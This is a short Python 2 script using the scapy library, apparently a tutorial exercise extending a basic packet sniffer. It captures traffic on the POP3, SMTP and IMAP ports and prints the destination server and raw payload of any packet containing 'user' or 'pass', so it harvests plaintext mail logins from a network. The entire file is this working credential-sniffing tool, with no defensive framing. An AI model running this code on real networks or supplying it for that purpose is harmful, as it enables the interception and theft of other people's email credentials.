from scapy.all import *

# Modification to 'basic_sniffer.py':	Adds a filter and logic for the callback function to filter specifically targeted strings

# Packet CALLBACK:	Receives each sniffed packet
#					- When called, will check to ensure packet has a DATA-PAYLOAD
def packet_callback(packet):
	if packet[TCP].payload:
		mail_packet = str(packet[TCP].payload)
		# Checks if packet[TCP].payload contains 'USER' | 'PASS' mail cmds.
		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print "[*] Server: %s" % packet[IP].dst#Prints DST.Server
			print "[*] %s" % packet[TCP].payload#Prints packet data-bytes

# Start SNIFFER:	Starts sniffing each packet for:
#    POP3 (110)
#    SMTP (25)
#    IMAP (143)
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
